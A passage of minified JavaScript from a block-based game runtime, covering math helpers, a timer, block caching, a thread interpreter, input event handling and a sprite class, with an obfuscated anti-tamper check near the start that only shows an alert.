            return t % e;
        },
        GqqCe: function (t, e) {
            return t - e;
        },
        OXsoA: _0x1722("0x33", "6Jn[")
    };
    s = "al";
    try {
        s += _0x1722("0x34", "6Jn["), n = encode_version, r[_0x1722("0x35", "PL#r")](void 0 === n ? "undefined" : _typeof$1(n), _0x1722("0x36", "IJpL")) && n === r[_0x1722("0x37", "Xqu7")] || e[s](r[_0x1722("0x38", "#Es[")]("删除", r.GXWfT));
    } catch (t) {
        r.ZLfIP(_0x1722("0x39", "ptqB"), _0x1722("0x3a", "7)7q")) ? (n = "0"[_0x1722("0x3b", "9C[Q")](0),
            resultArr[_0x1722("0x3c", "tkB9")](r[_0x1722("0x3d", "DJ$[")](r[_0x1722("0x3e", "DJ$[")](key[_0x1722("0x3f", "D@[4")](i), n) + num, 10) + n)) : e[s](r.OXsoA);
    }
}(window);

var encode_version = "", decrypt = decryptFun, Util = Object.freeze({
    __proto__: null,
    toNumber: toNumber,
    isInt: isInt,
    toBoolean: toBoolean,
    compare: compare,
    uid: uid,
    unique: unique,
    uniqueArr: uniqueArr,
    isArray: isArray,
    isString: isString,
    positionToRotation: positionToRotation$1,
    White: lists,
    getObjectValue: getObjectValue,
    getBlockFeilds: getBlockFeilds,
    decrypt: decrypt
});

function positionToRotation(t, e) {
    var i;
    return 0 === t && 0 === e ? 0 : (i = Math.pow(t * t + e * e, .5), e = Math.asin(e / i),
        (e = t < 0 ? 0 < e ? Math.PI - e : -Math.PI - e : e) < 0 ? e + 2 * Math.PI : e);
}

function makePointRotate(t, e, i) {
    var n = e.x - t.x, e = e.y - t.y, s = Math.cos(i), i = Math.sin(i);
    return {
        x: t.x + n * s - e * i,
        y: t.y + e * s + n * i
    };
}

function Add(t, e) {
    return Math.round(100 * t + 100 * e) / 100;
}

function Sub(t, e) {
    return Math.round(100 * t - 100 * e) / 100;
}

function Mul(t, e) {
    return Math.round(100 * t * e * 100) / 100;
}

function Div(t, e) {
    return Math.round(100 * t / e * 100) / 100;
}

function Strip(t) {
    var e = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : 2;
    return Math.round(t * Math.pow(10, e)) / Math.pow(10, e);
}

function segmentIntersectsQuad(t, e, i, n, s) {
    var r = 0, a = 0, o = t < i ? (r = t, i) : (r = i, t), l = e < n ? (a = e, n) : (a = n,
        e), h = s.getTlx(), u = s.getTly(), c = s.getTrx(), p = s.getTry(), d = s.getBrx(), g = s.getBry(), f = s.getBlx(), s = s.getBly();
    return segmentsIntersectPreCalc(t, e, i, n, r, o, a, l, h, u, c, p) || segmentsIntersectPreCalc(t, e, i, n, r, o, a, l, c, p, d, g) || segmentsIntersectPreCalc(t, e, i, n, r, o, a, l, d, g, f, s) || segmentsIntersectPreCalc(t, e, i, n, r, o, a, l, f, s, h, u);
}

function segmentsIntersectPreCalc(t, e, i, n, s, r, a, o, l, h, u, c) {
    var p, d, g, f, m, y = Math.abs, _ = 0, v = 0, k = 0, b = l < u ? (_ = l, u) : (_ = u,
        l);
    return !(r < _ || b < s || (v = h < c ? (k = h, c) : (k = c, h), o < k) || v < a || (p = l - t + u - i,
        d = h - e + c - n, m = y((f = n - e) * (r = u - l) - (_ = c - h) * (g = i - t)),
        y(r * d - _ * p) > m)) && y(g * d - f * p) <= m;
}

function clamp(t, e, i) {
    return t < e ? e : i < t ? i : t;
}

function GetRValue(t) {
    return 0 <= t ? (255 & t) / 255 : (8191 < (t = Math.floor(-t / 274877906944)) && (t -= 16384),
        t / 1024);
}

function GetGValue(t) {
    return 0 <= t ? ((65280 & t) >> 8) / 255 : (8191 < (t = Math.floor(-t % 274877906944 / 16777216)) && (t -= 16384),
        t / 1024);
}

function GetBValue(t) {
    return 0 <= t ? ((16711680 & t) >> 16) / 255 : (8191 < (t = Math.floor(-t % 16777216 / e)) && (t -= 16384),
        t / 1024);
}

function GetAValue(t) {
    return a(t) ? 0 : 0 <= t ? 1 : Math.floor(-t % e) / 1023;
}

function lerp(t, e, i) {
    return t + i * (e - t);
}

function round6dp(t) {
    return Math.round(1e6 * t) / 1e6;
}

var Vec2$1 = function () {
    function r(t, e) {
        classCallCheck(this, r), t && "object" === (void 0 === t ? "undefined" : _typeof$1(t)) && (e = t.y,
            t = t.x), this.x = t || 0, this.y = e || 0;
    }
    return createClass(r, null, [{
        key: "ZERO",
        get: function () {
            return new r(0, 0);
        }
    }]), createClass(r, [{
        key: "lerp",
        value: function (t, e, i) {
            i = i || new r();
            var n = this.x, s = this.y;
            return i.x = n + (t.x - n) * e, i.y = s + (t.y - s) * e, i;
        }
    }, {
        key: "sub",
        value: function (t, e) {
            return (e = e || new r()).x = this.x - t.x, e.y = this.y - t.y, e;
        }
    }, {
        key: "mag",
        value: function () {
            return Math.sqrt(this.x * this.x + this.y * this.y);
        }
    }]), r;
}(), MathUtil = Object.freeze({
    __proto__: null,
    positionToRotation: positionToRotation,
    makePointRotate: makePointRotate,
    Add: Add,
    Sub: Sub,
    Mul: Mul,
    Div: Div,
    Strip: Strip,
    segmentIntersectsQuad: segmentIntersectsQuad,
    segmentsIntersectPreCalc: segmentsIntersectPreCalc,
    clamp: clamp,
    GetRValue: GetRValue,
    GetGValue: GetGValue,
    GetBValue: GetBValue,
    GetAValue: GetAValue,
    lerp: lerp,
    round6dp: round6dp,
    Vec2: Vec2$1
}), Timer = function () {
    function t() {
        classCallCheck(this, t), this.startTime = 0, this.duration = 0;
    }
    return createClass(t, [{
        key: "time",
        value: function () {
            return t.nowObj.now();
        }
    }, {
        key: "relativeTime",
        value: function () {
            return t.nowObj.now();
        }
    }, {
        key: "start",
        value: function () {
            this.startTime = t.nowObj.now(), this.duration = 0;
        }
    }, {
        key: "timeElapsed",
        value: function () {
            return t.nowObj.now() - this.startTime;
        }
    }, {
        key: "frameClock",
        value: function (t) {
            return this.duration += t, this.duration;
        }
    }], [{
        key: "USE_PERFORMANCE",
        get: function () {
            return !1;
        }
    }, {
        key: "legacyDateCode",
        get: function () {
            return {
                now: function () {
                    return new Date().getTime();
                }
            };
        }
    }, {
        key: "nowObj",
        get: function () {
            return t.USE_PERFORMANCE && "undefined" != typeof self && self.performance && "now" in self.performance ? self.performance : Date.now ? Date : t.legacyDateCode;
        }
    }]), t;
}();

function CallBlockException(t, e, i) {
    this.id = t, this.name = e, this.msg = i;
}

function SpriteMissing(t) {
    this.id = t;
}

function SceneConfigMissing(t) {
    this.name = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : "",
        this.id = t;
}

var error = {
    CallBlockException: CallBlockException,
    SpriteMissing: SpriteMissing,
    SceneConfigMissing: SceneConfigMissing
}, ErrorHelper = Object.freeze({
    __proto__: null,
    CallBlockException: CallBlockException,
    SpriteMissing: SpriteMissing,
    SceneConfigMissing: SceneConfigMissing,
    default: error
});

function setCameraZone(t, e) {
    var i = t.screenHeight, n = t.screenWidth, s = e.width, r = a = e.height, a = (e = e.position).y - a / 2, e = e.x - s / 2;
    t.clamp({
        top: a,
        left: e,
        right: e + (s < n ? n : s),
        bottom: a + (r < i ? i : r)
    });
}

function setOutOrInCameraZone(t, e, i) {
    (i ? t.camera : t.map).addChild(e);
}

var eventsEmitter, Camera$1 = Object.freeze({
    __proto__: null,
    setCameraZone: setCameraZone,
    setOutOrInCameraZone: setOutOrInCameraZone
}), BlockCache = function () {
    function h(t, e, i) {
        classCallCheck(this, h), this.id = e.id, this.opcode = e.opcode, this.fields = e.fields,
            this.inputs = e.inputs, this.mutation = e.mutation, this.category = e.category,
            this.disabled = e.disabled, this._isHat = !1, this._blockFunction = null, this._definedBlockFunction = !1,
            this._isShadowBlock = !1, this._shadowValue = null, this._fields = Object.assign({}, this.fields),
            this._inputs = Object.assign({}, this.inputs), this._argValues = {
                mutation: this.mutation
            }, this._parentKey = null, this._parentValues = null, this._shadowOps = [], this._ops = [];
        var n, s, e = this.opcode, r = this.fields, a = this.inputs, e = (this._isHat = i._blockEngine.hats[e],
            this._blockFunction = i._blockEngine.blockFuncions[e], this._definedBlockFunction = void 0 !== this._blockFunction,
            e.split(".")), e = (this._isPluginAction = !1, 2 === e.length && i._blockEngine.isExistPluginAction(e[0], e[1]) && (this._isPluginAction = !0,
                this._pluginName = e[0], this._pluginMethod = e[1]), Object.keys(r));
        for (n in this._isShadowBlock = !this._definedBlockFunction && 1 === e.length && 0 === Object.keys(a).length,
            this._shadowValue = this._isShadowBlock && r[e[0]].value, r) this._argValues[n] = "VARIABLE" === n || "LIST" === n || "BROADCAST_OPTION" === n ? {
                id: r[n].id,
                name: r[n].value
            } : r[n].value;
        for (s in delete this._inputs.custom_block, "BROADCAST_INPUT" in this._inputs && (this._argValues.BROADCAST_OPTION = {
            id: null,
            name: null
        }, (a = this._inputs.BROADCAST_INPUT).block === a.shadow) && (e = t.getBlock(a.shadow).fields.BROADCAST_OPTION,
            this._argValues.BROADCAST_OPTION.id = e.id, this._argValues.BROADCAST_OPTION.name = e.value,
            delete this._inputs.BROADCAST_INPUT), this._inputs) {
            var o, l = this._inputs[s];
            l.block && (l = t.getCache(l.block, i)) && !l._isHat && ((o = this._shadowOps).push.apply(o, toConsumableArray(l._shadowOps)),
                (o = this._ops).push.apply(o, toConsumableArray(l._ops)), l._parentKey = s, l._parentValues = this._argValues,
                l._isShadowBlock) && (this._argValues[s] = l._shadowValue);
        }
        this._isPluginAction ? this._ops.push(this) : !this._isHat && this._isShadowBlock ? this._shadowOps.push(this) : this._definedBlockFunction && this._ops.push(this);
    }
    return createClass(h, [{
        key: "release",
        value: function () {
            this._blockFunction = null, this._ops = null, this._shadowOps = null, this._inputs = null,
                this._fields = null, this.fields = null, this.inputs = null;
        }
    }]), h;
}(), Blocks = function () {
    function s(t) {
        classCallCheck(this, s), this.map = t, this._cached = {
            blocks: {},
            procedureParamNames: {}
        }, this.getCache = this.getCache.bind(this);
    }
    return createClass(s, [{
        key: "release",
        value: function () {
            for (var t in this.getCache = null, this.map = null, this._cached.blocks) this._cached.blocks[t].release();
            this._cached = null;
        }
    }, {
        key: "extend",
        value: function (t) {
            Object.assign(this.map, _extends$1({}, t));
        }
    }, {
        key: "getBlock",
        value: function (t) {
            return this.map[t] || null;
        }
    }, {
        key: "getNextBlockId",
        value: function (t) {
            var e;
            return (t = this.getBlock(t)) && t.next ? (e = this.getBlock(t.next)) && e.disabled ? this.getNextBlockId(t.next) : t.next : null;
        }
    }, {
        key: "getBranch",
        value: function (t) {
            var e, i = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : 1, t = this.getBlock(t);
            return null != t && (e = s.BRANCH_INPUT_PREFIX, 1 < i && (e += i), void 0 !== (i = t.inputs[e])) && i.block ? this.getBlock(i.block).disabled ? this.getNextBlockId(i.block) : i.block : null;
        }
    }, {
        key: "getInputs",
        value: function (t) {
            var e = this.getBlock(t);
            if (null == e) return null;
            var i, n = {};
            for (i in e.inputs) i.substring(0, s.BRANCH_INPUT_PREFIX.length) !== s.BRANCH_INPUT_PREFIX && (n[i] = e.inputs[i]);
            return n;
        }
    }, {
        key: "getCache",
        value: function (t, e) {
            var i;
            return this._cached.blocks[t] || ((i = this.getBlock(t)) ? (i = new BlockCache(this, {
                id: t,
                opcode: i.opcode,
                fields: i.fields,
                inputs: this.getInputs(t),
                mutation: i.mutation,
                category: i.category,
                disabled: i.disabled
            }, e), this._cached.blocks[t] = i) : null);
        }
    }, {
        key: "getProcedureParamNamesIdsAndDefaults",
        value: function (t) {
            var e, i, n, s = this._cached.procedureParamNames[t];
            return void 0 !== s ? s : (i = (s = this.map[t]).mutation, e = s.opcode, s.inputs,
                i.proccode, s = i.argumentdefaults, n = i.argumentids, i = i.argumentnames, e === OPCODE.pp ? (e = JSON.parse(i),
                    i = JSON.parse(n), n = JSON.parse(s), this._cached.procedureParamNames[t] = [e, i, n],
                    this._cached.procedureParamNames[t]) : this._cached.procedureParamNames[t] = null);
        }
    }], [{
        key: "BRANCH_INPUT_PREFIX",
        get: function () {
            return "SUBSTACK";
        }
    }]), s;
}(), Variable$1 = function () {
    function s(t, e, i, n) {
        classCallCheck(this, s), this.id = t, this.name = e, this.type = i || "scalar",
            this.originalValue = n, this.init(n);
    }
    return createClass(s, [{
        key: "init",
        value: function (t) {
            switch (this.type) {
                case s.SCALAR_TYPE:
                    this.value = t || 0;
                    break;

                case s.BROADCAST_MESSAGE_TYPE:
                    this.value = this.name;
                    break;

                case s.LIST_TYPE:
                case s.TABLE_TYPE:
                    this.value = t ? JSON.parse(JSON.stringify(t)) : [];
                    break;

                case s.OBJECT_TYPE:
                    this.value = {};
            }
        }
    }, {
        key: "reset",
        value: function () {
            this.init(this.originalValue);
        }
    }], [{
        key: "SCALAR_TYPE",
        get: function () {
            return "scalar";
        }
    }, {
        key: "TABLE_TYPE",
        get: function () {
            return "table";
        }
    }, {
        key: "LIST_TYPE",
        get: function () {
            return "list";
        }
    }, {
        key: "OBJECT_TYPE",
        get: function () {
            return "object";
        }
    }, {
        key: "BROADCAST_MESSAGE_TYPE",
        get: function () {
            return "broadcast_msg";
        }
    }]), s;
}(), Thread = function () {
    function n(t, e, i) {
        classCallCheck(this, n), this.entry = t, this.status = n.STATUS_RUNNING, this.stack = [],
            this._sceneId = i, this.stackFrames = [], this.target = e, this.blocks = e.blocks,
            this.scope = Object.create(null), this.pushStack(t);
    }
    return createClass(n, [{
        key: "setRunningStatus",
        value: function () {
            this.status = n.STATUS_RUNNING;
        }
    }, {
        key: "setYieldStatus",
        value: function () {
            this.status = n.STATUS_YIELD;
        }
    }, {
        key: "setWaitStatus",
        value: function () {
            this.status = n.STATUS_WAIT;
        }
    }, {
        key: "setDoneStatus",
        value: function () {
            this.status = n.STATUS_DONE;
        }
    }, {
        key: "pushStack",
        value: function (t) {
            this.stack.push(t), this.stackFrames.push({
                isLoop: !1
            });
        }
    }, {
        key: "peekStack",
        value: function () {
            var t = this.stack.length;
            return 0 < t ? this.stack[t - 1] : null;
        }
    }, {
        key: "peekStackFrame",
        value: function () {
            var t = this.stackFrames.length;
            return 0 < t ? this.stackFrames[t - 1] : null;
        }
    }, {
        key: "popStack",
        value: function () {
            this.stack.pop(), this.stackFrames.pop();
        }
    }, {
        key: "goToNextBlock",
        value: function () {
            var t = this.blocks.getNextBlockId(this.peekStack());
            return this.popStack(), this.pushStack(t), t;
        }
    }, {
        key: "startBranch",
        value: function (t, e, i) {
            return t = this.blocks.getBranch(this.peekStack(), t), this.peekStackFrame().isLoop = e,
                Object.assign(this.peekStackFrame(), i), t && this.pushStack(t), t;
        }
    }, {
        key: "restart",
        value: function () {
            this.stop(), this.status = n.STATUS_RUNNING, this.stack.push(this.entry);
        }
    }, {
        key: "stop",
        value: function () {
            for (var t = this.peekStack(); null !== t;) this.popStack(), t = this.peekStack();
            0 === this.stack.length && (this.status = n.STATUS_DONE);
        }
    }, {
        key: "return",
        value: function () {
            for (var t = this.peekStack(), e = this.target.blocks.getBlock(t), i = e.parentFunctionID; null !== t && e.parentFunctionID === i;) this.popStack(),
                t = this.peekStack(), e = this.target.blocks.getBlock(t);
            0 === this.stack.length && (this.status = n.STATUS_DONE);
        }
    }, {
        key: "breakLogicLoop",
        value: function () {
            for (var t = this.peekStackFrame(); t && !t.isLogicLoop;) this.popStack(), t = this.peekStackFrame();
        }
    }, {
        key: "breakloop",
        value: function () {
            for (var t = this.peekStackFrame(); t && !t.isLoop;) this.popStack(), t = this.peekStackFrame();
        }
    }, {
        key: "isRecursiveCall",
        value: function (t) {
            for (var e = 5, i = this.stack.length - 1 - 1; 0 <= i; i--) {
                var n = this.target.blocks.getBlock(this.stack[i]);
                if ((n.opcode === OPCODE.pc || n.opcode === OPCODE.pcr) && n.mutation.proccode === t) return !0;
                if (--e < 0) return !1;
            }
            return !1;
        }
    }, {
        key: "getParam",
        value: function (t) {
            for (var e = this.stackFrames.length - 1; 0 <= e; e--) {
                var i = this.stackFrames[e];
                if (i.params) return i.params.hasOwnProperty(t) ? i.params[t] : null;
            }
            return null;
        }
    }], [{
        key: "STATUS_RUNNING",
        get: function () {
            return 0;
        }
    }, {
        key: "STATUS_WAIT",
        get: function () {
            return 1;
        }
    }, {
        key: "STATUS_YIELD",
        get: function () {
            return 2;
        }
    }, {
        key: "STATUS_DONE",
        get: function () {
            return 3;
        }
    }]), n;
}(), VMEventType = {
    initReady: "vm:renderReady",
    press: "vm:press",
    pointerdown: "vm:pointerdown",
    pointclick: "vm:pointclick",
    pointerup: "vm:pointerup",
    pointerupoutside: "vm:pointerupoutside",
    sceneChange: "vm:scenechange",
    clone: OPCODE.eventStartAsClone,
    stageSwipe: OPCODE.eventScreenSwip,
    click: OPCODE.eventTouchingScreen + "_click_",
    pointermove: OPCODE.eventTouchingScreen + "_move_",
    loose: OPCODE.eventTouchingScreen + "_loose_",
    moveout: OPCODE.eventObjectMoveout,
    collision: OPCODE.eventObjectTouchingObject,
    start: OPCODE.eventTouchingScreen + "_start_",
    dblclick: OPCODE.eventTouchingScreen + "_dblclick_"
}, EventType = {
    loose: OPCODE.eventTouchingSprite + "_loose_",
    press: "sprite:press",
    click: OPCODE.eventTouchingSprite + "_click_",
    dblclick: OPCODE.eventTouchingSprite + "_dblclick_",
    modified: "sprite:modified",
    select: "sprite:select",
    update: "sprite:update",
    pointerdown: OPCODE.eventTouchingSprite + "_tap_",
    pointclick: "sprite:pointclick",
    pointerup: "sprite:pointerup",
    pointerupoutside: "sprite:pointerupoutside",
    dragstart: "sprite:dragstart",
    collision: "sprite:collision"
}, SystemEventType = {
    keyup: "keyup",
    keydown: "keydown",
    joyStickStart: "joystickstart",
    joyStickMove: "joystickmove",
    joyStickStop: "joystickstop",
    switchStyle: "switchStyle"
};

function getEventEmitter() {
    return eventsEmitter || ((eventsEmitter = new EventEmitter__default.default()).SystemEventType = SystemEventType,
        eventsEmitter.VMEventType = VMEventType), eventsEmitter;
}

function attachDOMEvent() {
    window.addEventListener("keydown", _onKeyEvent), window.addEventListener("keyup", _onKeyEvent),
        window.addEventListener("dblclick", _onMouseEvent), window.addEventListener("wheel", _onMouseWheelEvent);
}

function removeDOMEvent() {
    window.removeEventListener("keydown", _onKeyEvent), window.removeEventListener("keyup", _onKeyEvent),
        window.removeEventListener("dblclick", _onMouseEvent), window.removeEventListener("wheel", _onMouseWheelEvent);
}

function _onKeyEvent(t) {
    var e = {
        code: t.code,
        key: t.key,
        which: t.which,
        repeat: t.repeat,
        altKey: t.altKey,
        ctrlKey: t.ctrlKey,
        metaKey: t.metaKey,
        shiftKey: t.shiftKey,
        timeStamp: t.timeStamp
    };
    eventsEmitter.emit(t.type, e), SystemEventType[t.key] && eventsEmitter.emit(SystemEventType[t.key], e);
}

function _onMouseWheelEvent(t) {
    var e = {
        clientX: t.clientX,
        clientY: t.clientY,
        deltaX: t.deltaX,
        deltaY: t.deltaY,
        deltaZ: t.deltaZ,
        deltaMode: t.deltaMode,
        timeStamp: t.timeStamp
    };
    eventsEmitter.emit(t.type, e);
}

function _onMouseEvent(t) {
    var e = {
        button: t.button,
        buttons: t.buttons,
        clientX: t.clientX,
        clientY: t.clientY,
        timeStamp: t.timeStamp
    };
    eventsEmitter.emit(t.type, e);
}

var PixelRatio = getDeviceInfo().devicePixelRatio, DEVICEPIXEL = PixelRatio / 2, GAMEWIDTH = Config.GAME_WIDTH * PixelRatio, GAMEHEIGHT = Config.GAME_HEIGHT * PixelRatio;

function parseSpriteConfig(t, e, i) {
    var n, s = (t.config || t).properties, r = t.id, a = t.name, o = t.type, l = t.rotation_type, h = t.draggable, u = t.lock, c = t.styles, p = t.currentStyle, d = t.origin, g = t.mother, f = t.parent, m = (s = s || t.config).x, y = s.y, _ = s.visible, v = s.width, k = s.height, b = s.scale, x = s.align, I = s.rotation, w = s.text, C = s.verticalAlign, S = s.fontFamily, P = s.fontSize, R = s.fontWeight, N = s.fillColor, H = s.backgroundColor, F = s.effect, j = s.padding, G = s.pivot, X = s.mirror, W = s.lineHeight, U = s.repeat, V = s.fixed, Y = s.stroke, z = s.strokeThickness, $ = s.adaptationMode, q = s.widgetModeH, Q = s.widgetModeV, K = s.widgetH, J = s.widgetV, T = void 0 === (T = s.blendMode) ? 0 : T, O = void 0 === (O = s.alpha) ? 1 : O, s = void 0 === (s = s.tint) ? "#FFFFFF" : s, Z = t.config.outline, E = Object.create(null);
    if (c) for (var B = 0; B < c.length; B++) {
        var L, M = c[B];
        if (L = e[M] ? e[M].frame || [{
            id: M
        }] : void 0) {
            E[M] = [];
            for (var A = 0; A < L.length; A++) {
                var D = i.loaderManager.getTexture(L[A].id);
                D && E[M].push({
                    id: L[A].id,
                    texture: D
                });
            }
        }
    }
    return "background" !== (r = {
        id: r,
        visible: _,
        alpha: O,
        name: a,
        width: v,
        height: k,
        type: o,
        rotation: I,
        rotation_type: l,
        draggable: h,
        scale: b,
        lock: u,
        align: x,
        tint: s,
        currentStyleId: p,
        styles: c,
        textureMap: E,
        x: m * DEVICEPIXEL,
        y: y * DEVICEPIXEL,
        gameWidth: GAMEWIDTH,
        gameHeight: GAMEHEIGHT,
        origin: d,
        mother: g,
        verticalAlign: C,
        fontFamily: S,
        fontSize: P,
        fontWeight: R,
        fillColor: N,
        backgroundColor: H,
        text: w,
        effect: F,
        padding: j,
        pivot: G,
        mirror: X,
        lineHeight: W,
        repeat: U,
        outline: Z,
        fixed: V,
        stroke: Y,
        strokeThickness: z,
        adaptationMode: $,
        widgetModeH: f ? 0 : q,
        widgetModeV: f ? 0 : Q,
        widgetH: K,
        widgetV: J,
        blendMode: T,
        pluginProperties: t.config.pluginProperties
    }).type && (r.width *= DEVICEPIXEL, r.height *= DEVICEPIXEL), r.padding && (n = [],
        r.padding.forEach(function (t) {
            n.push(t * DEVICEPIXEL);
        }), r.padding = n), r.fontSize && (r.fontSize *= DEVICEPIXEL), t.origin && (r.origin = t.origin),
        r;
}

var Sprite$1 = function () {
    function T(t) {
        var e = t.config, i = void 0 === (i = t.isOriginal) || i, n = t.vm, s = t.stylesMap, r = t.sceneRenderer, t = t.ContainerID, a = (classCallCheck(this, T),
            e.id), o = e.name, l = void 0 === (l = e.type) ? "normal" : l, h = e.parent, u = void 0 === (u = e.children) ? [] : u, c = void 0 === (c = e.scripts) ? [] : c, p = e.mother, d = e.blocks, g = e.origin, f = e.variables, m = e.creator, y = e.currentStyle, _ = void 0 === (v = e.styles) ? [] : v, v = (this.config = e,
                this.vm = n, this.app = n.renderer, this.eventEmitter = getEventEmitter(), this.creator = m,
                this.mother = p, this.orientation = 0, this.ContainerID = t, this._behaviors = [],
                this._behaviorInst = {}, this.origin = g, this.id = a || uid(), this.type = l, this.name = o || this.id,
                this.parent = h, this.children = u, this.layerChildren = u, this.isOriginal = i,
                this.variables = Object.create(null), Object.create(null)), e = [], n = Object.create(null);
        g && 0 < g.length ? (m = this.vm.config.components[g]) && (v = Object.assign({}, v, m.blocks),
            e = m.scripts, this.currentStyle = y || m.currentStyle, this.styles = m.styles,
            n = m.variables) : (this.currentStyle = y, this.styles = _), this._texture_id_map = Object.create(null);
        for (var k = 0; k < _.length; k++) {
            var b = this.vm.config.styles[_[k]];
            this._texture_id_map[_[k]] = b ? b.frame.filter(function (t) {
                return t.id;
            }).map(function (t) {
                return t.id;
            }) : [];
        }
        this.blocks = new Blocks(Object.assign({}, v, d)), this.scripts = unique(c.concat(e));
        var x, I = _extends$1({}, n, f);
        for (x in I) {
            var w = (P = I[x]).varId, C = P.varName, S = P.varType, P = P.varValue;
            this.variables[x] = new Variable$1(w, C, S, P);
        }
        this.eventList = [], this.checkOutOfBoundaryFlag = [], this.checkCollisionBoundaryFlag = [],
            this.offHats = this.offHats.bind(this), this.sceneRenderer = r, this.renderer = r.addSprite(parseSpriteConfig(this, s, this.app), t),
            i || this.bindHats();
    }
    return createClass(T, [{
        key: "afterRenderObjectReady",
        value: function () {
            "plugin" === this.config.type && this._createPluginInstance(this.config.pluginId, this.config.pluginProperties, this.config.properties),
                this.config.plugins && 0 < this.config.plugins.length && this._createBehaviorsInstance(this.config.plugins);
        }
    }, {
        key: "getBehaviorInstaceById",
        value: function (t) {
            return this._behaviorInst[t];
        }
    }, {
        key: "dispose",
        value: function () {
            this.blocks.release(), this.blocks = null, this.offHats(), this.config = null, this.vm = null,
                this.app = null, this.eventEmitter = null, this.creator = null, this.mother = null,
                this.ContainerID = null, this._behaviors = null, this._behaviorInst = null, this.origin = null,
                this.children = null, this.layerChildren = null, this.variables = null, this.eventList = null,
                this.checkOutOfBoundaryFlag = null, this.checkCollisionBoundaryFlag = null, this.sceneRenderer = null;
        }
    }, {
        key: "release",
        value: function () {
            for (var t in this._behaviorInst) this._behaviorInst[t].release(), this._behaviorInst[t] = null;
            this._objectIntance && (this._objectIntance.release(), this._objectIntance = null);
        }
    }, {
        key: "getSdkInstance",
        value: function () {
            if (this._objectIntance) return this._objectIntance.getSdkInstance();
            throw "当前精灵不能运行该插件积木";
        }
    }, {
        key: "_createBehaviorsInstance",
        value: function (t) {
            if (t) {
                var e = !0, i = !1, n = void 0;
                try {
                    for (var s, r = t[Symbol.iterator](); !(e = (s = r.next()).done); e = !0) {
                        var a = s.value, o = LB.Behaviors[a.id];
                        if (!o) throw "missing behavior";
                        var l = this.vm.getPluginManager().getBehaviorByConstructorFunction(o), h = new o.Instance({
                            runtime: this.vm,
                            instance: this,
                            type: l
                        }, this.transformpProperties(a.properties));
                        l._addInstance(h), this._behaviorInst[a.id] = h;
                    }
                } catch (t) {
                    i = !0, n = t;
                } finally {
                    try {
                        !e && r.return && r.return();
                    } finally {
                        if (i) throw n;
                    }
                }
                this.renderer._behaviorInst = this._behaviorInst;
            }
        }
    }, {
        key: "hasSolidBehaviours",
        value: function () {
            return !!this._behaviorInst.Solid;
        }
    }, {
        key: "transformpProperties",
        value: function (t) {
            var e, i = {};
            for (e in t) i[e] = t[e].value;
            return i;
        }
    }, {
        key: "_createPluginInstance",
        value: function (t, e, i) {
            t = this.vm._objectClassesByName.get(t.toLowerCase()), this._objectIntance = t.createInstance(this.renderer, e, i);
        }
    }, {
        key: "bindHats",
        value: function () {
            var n = this;
            if (!this._hasBind) {
                for (var t = 0; t < this.scripts.length; t++) !function (t) {
                    var l, h, u, c = n.scripts[t], e = (t = n.blocks.getCache(c, n.vm)).opcode, i = t._argValues;
                    !t.disabled && (l = void 0 === (t = i.OPTION_LIST) ? "" : t, h = void 0 === (t = i.OPTION_LIST1) ? "" : t,
                        u = void 0 === (t = i.OPTION_LIST2) ? "" : t, i = n.vm._blockEngine.hats[e]) && (n.isOriginal || !i.originalOnly) && (e !== OPCODE.eventObjectMoveout || "_self_" !== h && h !== n.id || n.checkOutOfBoundaryFlag.push(u),
                            e === OPCODE.eventObjectTouchingObject && -1 < ["_edge_", "_left_edge_", "_right_edge_", "_top_edge_", "_bottom_edge_"].indexOf(u) && ("_self_" !== h && h !== n.id || n.checkCollisionBoundaryFlag.push(u)),
                            t = i.edgeActivated ? e + l : e, i = function (t, e, i, n) {
                                var s = 4 < arguments.length && void 0 !== arguments[4] && arguments[4];
                                if ((!e || !Array.isArray(e) || e.includes(this.id)) && !(e && "string" == typeof e && this.id !== e && "_all_" !== e || t && t.OPTION_LIST && t.OPTION_LIST !== l)) {
                                    if (i && n) {
                                        if ((e = this.vm.runtimeData.getSpriteById(i)) && (e.collider = n), (t = this.vm.runtimeData.getSpriteById(n)) && (t.collider = i),
                                            this.vm.runtimeData.getSpriteById(n), "_self_" === h) {
                                            if (i !== this.id) return;
                                        } else if (-1 === this.vm.runtimeData.getCloneListById(h).indexOf(i)) return;
                                        if (u !== n && -1 === this.vm.runtimeData.getCloneListById(u).indexOf(n)) return;
                                    }
                                    var r, a, o, e = new Thread(c, this, this.sceneRenderer.id);
                                    i && n && ("_self_" === (t = h) && (o = this.isOriginal, r = this.id, a = this.mother,
                                        t = o ? r : a), e.scope[t] = i, e.scope[u] = n), s ? (o = this.vm._blockEngine.currentThread,
                                            this.vm._blockEngine._threadIndex, this.vm._blockEngine.threads.push(e), this.vm._blockEngine.executeThread(e),
                                            this.vm._blockEngine._currentThread = o) : this.vm._blockEngine.threads.push(e);
                                }
                            }.bind(n), n.eventList.push({
                                eventName: t,
                                fn: i
                            }), n.eventEmitter.on(t, i, n.id));
                }(t);
                this._hasBind = !0;
            }
        }
    }, {
        key: "offHats",
        value: function () {
            this._hasBind = !1;
            for (var t = 0; t < this.eventList.length; t++) {
                var e = (i = this.eventList[t]).eventName, i = i.fn;
                this.eventEmitter.removeListener(e, i);
            }
            for (var n = 0; n < this.eventList.length; n++) this.eventList.pop();
        }
    }, {
        key: "update",
        value: function (t) {
            var e = this;
            this.checkOutOfBoundaryFlag.length && this.checkOutOfBoundaryFlag.forEach(function (t) {
                e.renderer.checkOutOfBoundary(t, !0);
            }), this.checkCollisionBoundaryFlag.length && this.checkCollisionBoundaryFlag.forEach(function (t) {
                e.renderer.checkCollisionOfEdge(t, !0);
            }), this.renderer.update(t);
        }
    }, {
        key: "reset",
        value: function () {
            var t, e, i = 0 < arguments.length && void 0 !== arguments[0] ? arguments[0] : {};
            for (t in this.variables) this.variables[t].reset();
            for (e in this.checkOutOfBoundaryFlag = [], this.checkCollisionBoundaryFlag = [],
                i) this[e] = i[e];
            this.currentStyle = this.config.currentStyle, this.renderer.reset(i.id);
        }
    }, {
        key: "sleep",
        value: function () {
            this.offHats(), this.isDeleted = !0, this.renderer.parent.removeChild(this.renderer),
                delete this.sceneRenderer.cache[this.id];
        }
    }, {
        key: "wake",
        value: function () {
            delete this.isDeleted, this.sceneRenderer.createLayer({
                id: this.id,
                mother: this.mother,
                ContainerID: this.ContainerID
            }, this.renderer), this.bindHats();
        }
    }, {
        key: "lookupVariable",
        value: function (t) {
            if (t = this.variables[t]) return t;
        }
    }]), T;
}(), _extends = function () {
